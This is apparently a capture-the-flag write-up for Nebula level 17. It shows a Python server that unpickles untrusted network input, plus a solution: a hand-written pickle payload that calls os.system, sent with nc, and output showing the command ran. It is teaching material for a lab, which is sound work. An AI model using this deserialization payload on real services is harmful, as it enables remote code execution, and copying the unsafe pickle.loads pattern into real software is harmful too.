# Level17

#### About

There is a python script listening on port 10007 that contains a vulnerability. 
To do this level, log in as the level17 account with the password level17. Files for this level can be found in /home/flag17. 


#### Source code

```
#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
	line = skt.recv(1024)

	obj = pickle.loads(line)

	for i in obj:
		clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
	clnt, addr = skt.accept()

	if(os.fork() == 0):
		clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
		server(clnt)
		exit(1)
```

#### Soltions

```
level17@nebula:~$ cat /tmp/lv17.txt 
cos
system
(S'getflag > /tmp/pwnie17'
tR.
level17@nebula:~$ nc 192.168.1.106 10007 </tmp/lv17.txt 
Accepted connection from 192.168.1.106:41703
^C
level17@nebula:~$ cat /tmp/pwnie17 
You have successfully executed getflag on a target account
```

#### Recommneds

http://www.slideshare.net/sensepost/sour-pickles
